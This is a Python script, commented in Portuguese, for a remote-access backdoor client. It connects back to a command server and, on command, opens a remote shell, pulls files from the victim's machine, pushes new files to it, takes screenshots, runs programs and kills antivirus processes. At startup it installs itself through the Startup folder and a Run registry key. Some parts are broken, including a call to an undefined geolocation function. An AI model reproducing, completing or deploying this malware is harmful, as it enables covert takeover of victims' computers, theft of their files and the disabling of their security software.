#!/bin/bash/env python3


import socket, os, time, subprocess, tempfile, random, threading

if(os.name == 'posix'): # try import propely screenshot module
    try:
        import pyscreenshot
    except ImportError:
        pass
elif(os.name == 'nt'):
    try:
        import ImageGrab
    except ImportError:
        pass


filename='backdoor.exe' 
tempdir = tempfile.gettempdir()

def run(command):
    command = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return command.stdout.readlines()


def run_program(s , program_name):
    if(os.path.isfile(program_name)):
        sys = os.name
        if(sys == 'nt'):
            execute = 'start'
            if('.exe' in program_name): # apenas executa o programa
                command = program_name
            else:
                command = execute + ' ' + program_name

        elif(sys == 'posix'):
            execute = './'
            command = execute + program_name

        if('.py' in program_name):
            execute = 'python '
            command = execute + program_name

        thread = threading.Thread(target=run, args = (command,), name='run')
        thread.start()
        s.send('0')
    else: # arquivo não existe
        s.send('1')


def screenshot(s):
    name = tempdir + '/screenshot'+str(random.randint(0,1000000)) + '.png'
    if(os.name == 'posix'): # se for unix-like
        img = pyscreenshot.grab()
        img.save(name)
    elif(os.name == 'nt'): # se for windows
        img = ImageGrab.grab()
        img.save(name)

    with open(name ,'rb') as f: 
        l = f.read(1024)
        l = name + '+/-' + l
        while(l):
            s.send(l)
            l = f.read(1024)

    print('sent')
    s.shutdown(socket.SHUT_WR)
    os.remove(name)


def upload(s):
    l = s.recv(1024)
    filename = l.split('+/-')[0]
    print(filename)

    with open(filename,'wb') as f: 
        l = l.split('+/-')[1]
        j = s.recv(1024)
        l = l + j
        while (l):
            f.write(l)
            l = s.recv(1024)


def shell(s):
    while True:
        data = s.recv(1024)
        if(not data or data=='exit'):
            break
        if(data == 'shell'):
            pass
        else:
            if(data.split(' ')[0] == 'cd'): # trocar de diretorio
                try:
                    directory = (data.split(' ')[1])
                    if(os.path.isdir(directory)):
                        path = os.chdir(directory.rstrip('\n'))
                        local = os.getcwd()
                        s.send(local)
                    else:
                        s.send('caminho não existe\n'+ os.getcwd())
                except Exception as e:
                    s.send('Error -> '+ e)
            else: 
                command = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                ret = command.stdout.read() + command.stderr.read()
                if(ret == ''):
                    s.send('done')
                else:
                    s.send(ret)


def download(s):
    filename = s.recv(1024)
    print(filename)
    if(os.path.isfile(filename)):
        with open(filename, 'rb') as f: 
            l = f.read(1024)
            l = 'True+/-' + l
            while(l):
                s.send(l)
                l = f.read(1024)

        print('sent')
        s.shutdown(s.SHUT_WR)

    else:
        s.send('False')


def kill_antivirus():
    with open('av.txt') as f:
        avs = f.read()
        avs = avs.split('\n')
    processes = run('TASKLIST /FI "STATUS eq RUNNING"')
    ps = []
    for i in processes.split(' '):
        if (".exe" in i):
            ps.append(i.replace('K\n','').replace('\n',''))
    for av in avs:
        for p in ps:
            if(p == av):
                subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)


def persistence(sys):
    if(sys == 'nt'):
        user = os.path.expanduser('~')
        directory = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        path = os.path.join(user, directory)

        if(os.path.isdir(path)): # copia o backdoor para diretorio startup
            subprocess.Popen('copy ' + filename + ' ' + path, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR

        if(not os.getcwd() == tempdir): # salva backdoor no registro
            subprocess.Popen('copy ' + filename + ' ' + tempdir, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
            FNULL = open(os.devnull,'w')
            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + tempdir + "\\" + filename, stdout=FNULL, stderr=FNULL)

    elif(sys == 'posix'):
        pass

def connect(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(r'[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def execute(socket):
    while True:
        try:
            data = socket.recv(1)
            if(not data): # servidor desconectou, recomeça
                return
            else:
                try:
                    if(data=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
                        upload(socket)
                    elif(data=='2'): # shell reversa -> servidor se conecta a maquina do infectado
                        shell(socket)
                    elif(data=='3'): # Download
                        download(socket)
                    elif(data == '4'): # Killav
                        kill_antivirus()
                    elif(data == '5'): # screenshot
                        screenshot(socket)
                    elif(data == '6'):
                        programa = socket.recv(1024)
                        print(programa)
                        run_program(socket, programa)
                    elif(data == '7'):
                        geolocation(socket)
                    else:
                        print(data)

                except:
                    return
        except: # algum erro ocorreu, recomeça
            return

def main():
    ip = '127.0.0.1'
    port = 1025
    while (True):
        connection = connect(ip, port)
        if(connection):
            execute(connection)
        else:
            time.sleep(5)

if __name__=='__main__':
    if(os.name == 'nt'):
        persistence('nt')
    elif(os.name == 'posix'):
        persistence('posix')
    main()
